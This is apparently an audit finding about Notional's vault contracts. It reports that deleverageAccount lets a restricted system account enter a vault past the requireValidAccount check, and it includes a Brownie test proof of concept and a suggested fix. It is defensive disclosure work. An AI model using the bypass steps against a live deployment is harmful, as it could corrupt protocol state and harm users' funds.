Arbitrary-Execution
# `deleverageAccount` can be used by an address to enter a vault that would otherwise be restricted by the `requireValidAccount` check in `enterVault`

## Summary
`deleverageAccount` can be used by an address to enter a vault that would otherwise be restricted by the `requireValidAccount` check in `enterVault`

## Vulnerability Detail
When `enterVault` in `VaultAccountAction.sol` is called, the first function that is called is `requireValidAccount`. This function checks to ensure that the passed-in `account` parameter is not a system-level account address:

```solidity
require(account != Constants.RESERVE); // Reserve address is address(0)
require(account != address(this));
(
    uint256 isNToken,
    /* incentiveAnnualEmissionRate */,
    /* lastInitializedTime */,
    /* assetArrayLength */,
    /* parameters */
) = nTokenHandler.getNTokenContext(account);
require(isNToken == 0);
```

With the above checks, `requireValidAccount` ensures that any Notional system-level account cannot enter a vault. However, `deleverageAccount` in `VaultAccountAction.sol` allows liquidators to transfer vault shares from a liquidated account into their own account. In the case that a liquidator is not already entered into a vault, then `deleverageAccount` will instantiate a vault account for them (using `_transferLiquidatorProfits`) before depositing the liquidated account's vault shares into the newly-instantiated account. This effectively circumvents the `requireValidAccount` check in `enterVault`.

## Impact
Any address that would otherwise be restricted from entering vaults via the `requireValidAccount` check would be able to circumvent that function using `deleverageAccount`. I assume these system-level accounts are restricted from entering vaults as they have access to internal Notional state and are used across the protocol, so having them be able to enter vaults could negatively impact Notional.

Note: This issue may be infeasible if all the relevant Notional system accounts are smart contracts that do not allow arbitrary calls.

## Code Snippet
PoC (add to `tests/stateful/vaults/test_vault_deleverage.py`);
```python
def test_deleverage_account_instantiate_liquidator_maturity(environment, accounts, vault):
    environment.notional.updateVault(
        vault.address,
        get_vault_config(currencyId=2, flags=set_flags(0, ENABLED=True)),
        100_000_000e8,
    )
    maturity = environment.notional.getActiveMarkets(1)[0][1]
    systemAccount = accounts.at(environment.nToken[1], force=True)
    environment.token["DAI"].transfer(systemAccount, 10_000_000e18, {"from": accounts[0]})
    environment.cToken["DAI"].transfer(systemAccount, 10_000_000e8, {"from": accounts[0]})
    environment.token["DAI"].approve(environment.notional.address, 2 ** 256 - 1, {"from": systemAccount})
    environment.cToken["DAI"].approve(environment.notional.address, 2 ** 256 - 1, {"from": systemAccount})

    with brownie.reverts():
        # nToken address is not allowed to enter a vault
        environment.notional.enterVault(
            systemAccount,
            vault.address,
            100_000e18,
            maturity,
            100_000e8,
            0,
            "",
            {"from": systemAccount},
        )

    environment.notional.enterVault(
        accounts[1], vault.address, 50_000e18, maturity, 200_000e8, 0, "", {"from": accounts[1]}
    )

    vault.setExchangeRate(0.95e18)

    environment.notional.deleverageAccount(
        accounts[1], vault.address, systemAccount, 1_000e8, True, "", {"from": systemAccount}
    )

    # System account now has a position in the vault
    systemAccountInfo = environment.notional.getVaultAccount(systemAccount, vault)
    assert systemAccountInfo["maturity"] != 0
```

## Tool used

Manual Review

## Recommendation
Consider updating the `require` statement in `_transferLiquidatorProfits` to the following:
```solidity
require(liquidator.maturity == maturity, "Vault Shares Mismatch"); // dev: has vault shares
```
